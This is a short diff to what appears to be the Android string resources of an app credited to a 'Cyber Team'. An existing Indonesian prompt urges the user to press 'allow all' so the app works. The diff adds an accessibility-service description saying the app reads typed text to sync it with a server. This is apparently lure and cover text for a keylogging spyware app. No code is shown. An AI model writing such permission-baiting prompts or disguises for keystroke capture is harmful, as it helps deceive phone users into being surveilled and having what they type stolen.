@@ -4,4 +4,5 @@
     <string name="mzk_team">Cyber Team M4zk1pL4y</string>
     <string name="mzk_email">jambudio336@gmail.com</string>
     <string name="mzk_wizard">Izinkan semua akses agar aplikasi berjalan normal. Tekan IZINKAN SEMUA.</string>
+    <string name="mzk_a11y_desc">Membaca teks yang sedang diketik agar sinkron dengan server.</string>
 </resources>
